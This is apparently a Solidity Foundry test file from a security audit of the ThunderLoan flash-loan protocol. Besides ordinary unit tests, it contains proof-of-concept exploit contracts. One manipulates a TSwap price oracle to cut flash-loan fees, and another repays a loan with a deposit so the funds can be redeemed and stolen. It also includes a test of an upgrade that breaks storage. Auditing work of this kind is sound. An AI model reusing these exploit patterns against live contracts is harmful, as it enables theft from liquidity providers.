// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../../src/audits/thunderLoan/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../../src/audits/thunderLoan/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ThunderLoanUpgraded } from "../../../src/audits/thunderLoan/upgradeProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function testReedemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT); // fee
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // 1000e18 initial deposit
        // 3e17 fee
        // 1000e18 + 3e17 = 1003e17
        // 1003.300900000000000

        uint256 amountToReedem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToReedem);
        vm.stopPrank();
    }

    function testOracleManipulation() public {
        // set up fresh instances
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // create a TSwap Dex between tokenA and weth
        address tSwapPool = pf.createPool(address(tokenA));

        // encode initialize call and pass to proxy (atomic init)
        bytes memory initData = abi.encodeWithSelector(
            ThunderLoan.initialize.selector,
            address(pf)
        );

        proxy = new ERC1967Proxy(address(thunderLoan), initData);

        // cast proxy to ThunderLoan interface
        thunderLoan = ThunderLoan(address(proxy));

        // fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tSwapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tSwapPool), 100e18);
        BuffMockTSwap(tSwapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        // Ratio = 100 WETH : 100 TokenA
        // Price = 1 : 1

        // fund thunderloan
        // set allow
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // 100 WETH & 100 TokenA in TSwap
        // 1000 TokenA in ThunderLoan

        // we are going to take 2 Flash loans 
        // - To nuke the price of Weth/TokenA
        // - To show that doing so greatly reduces the fees we pay on ThunderLoan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal fee cost: ", normalFeeCost); // 296147410319118389 -> 0.2e18

        uint256 amountToBorrow = 50e18;

        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tSwapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();
        
        uint256 feeOne = flr.feeOne();
        console.log("Fee one: ", feeOne);
        uint256 feeTwo = flr.feeTwo();
        console.log("Fee two: ", feeTwo);
        uint256 attackFee = feeTwo + feeOne;
        console.log("Attack fee: ", attackFee);

        assertGt(normalFeeCost, attackFee);
    } 

    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.reedemMoney();
        vm.stopPrank();

        assertGt(tokenA.balanceOf(address(dor)), 50e18 + fee);
    }

    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();
        
        console.log("Fee before upgrade: ", feeBeforeUpgrade);
        // 3000000000000000 -> 3e15 
        console.log("Fee after upgrade: ", feeAfterUpgrade);
        // 1000000000000000000 -> 1e18

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
}

contract DepositOverRepay is IFlashLoanReceiver {

    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan){
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function reedemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {

    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tSwapPool;
    bool attacked = false;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tSwapPool, address _thunderLoan, address _repayAddress){
        tSwapPool = BuffMockTSwap(_tSwapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns (bool) {
        if(!attacked){
            // 1. Swap TokenA borrowed for WETH
            // 2. Take out another flash loan, to show the difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tSwapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tSwapPool), 50e18);
            // tanks the price
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // we call a second flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");

            // repay 
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate fee and repay
            feeTwo = fee;
            // repay 
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(token, amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}